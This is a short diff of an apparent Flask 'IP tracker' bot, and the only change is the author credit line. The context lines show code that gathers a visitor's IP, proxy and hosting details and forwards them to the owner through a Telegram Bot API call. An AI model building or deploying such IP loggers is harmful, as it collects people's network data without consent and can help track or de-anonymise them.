@@ -42,7 +42,7 @@ def main():
     *Proxy :* `{info['proxy']}`
     *Hosting :* `{info['hosting']}`
     
-    *BOT BY :* t.me/buddyboss
+    *BOT BY :* @itzz_james
     """
     requests.get(f'https://api.telegram.org/bot{BOT_API}/sendmessage?chat_id={OWNER_ID}&text={output}&parse_mode=Markdown')
     return jsonify({"Your IP Address ":info['query'], "Status":"IP successfully tracked."})
